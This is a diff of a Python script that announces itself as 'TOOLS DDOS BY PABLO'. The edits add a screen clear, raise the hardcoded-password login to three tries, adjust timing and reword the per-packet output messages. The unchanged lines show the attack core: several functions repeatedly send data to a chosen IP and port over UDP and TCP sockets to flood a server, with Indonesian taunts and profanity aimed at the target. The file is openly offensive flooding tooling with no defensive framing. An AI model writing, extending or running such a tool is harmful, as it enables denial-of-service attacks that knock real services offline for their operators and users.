@@ -8,7 +8,8 @@ import os
 
 pasw = "Pablo"
 
-for i in range(1):
+os.system("clear")
+for i in range(3):
     pwd = input(" Password : ")
     j = 3
     if (pwd == pasw):
@@ -20,9 +21,9 @@ for i in range(1):
         time.sleep(.4)
         print("\033[1;31;40m] [x]AWOKAWOK SALAH \n")
         continue
-time.sleep(.3)
+time.sleep(.7)
 print("\033[1;36;40m Succesfull Logins To Server")
-time.sleep(.6)
+time.sleep(.9)
 
 os.system("clear")
 print("\u001b[35m WELCOME TO TOOLS DDOS BY PABLO")
@@ -115,7 +116,7 @@ def xxxxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
     except:
       print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
@@ -128,7 +129,7 @@ def xxxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
     except:
       print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
@@ -141,7 +142,7 @@ def xxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
     except:
       print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
@@ -155,7 +156,7 @@ def xxx():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
     except:
       s.close()
       print("[!] MATI LU SERVER NGENTOD")
@@ -170,7 +171,7 @@ def xx():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
     except:
       s.close()
       print("[!] SERVER LEMAH JANCOKK")
@@ -185,7 +186,7 @@ def x():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
     except:
       s.close()
       print("[!] SERVER MU LEMAH SEKALI")
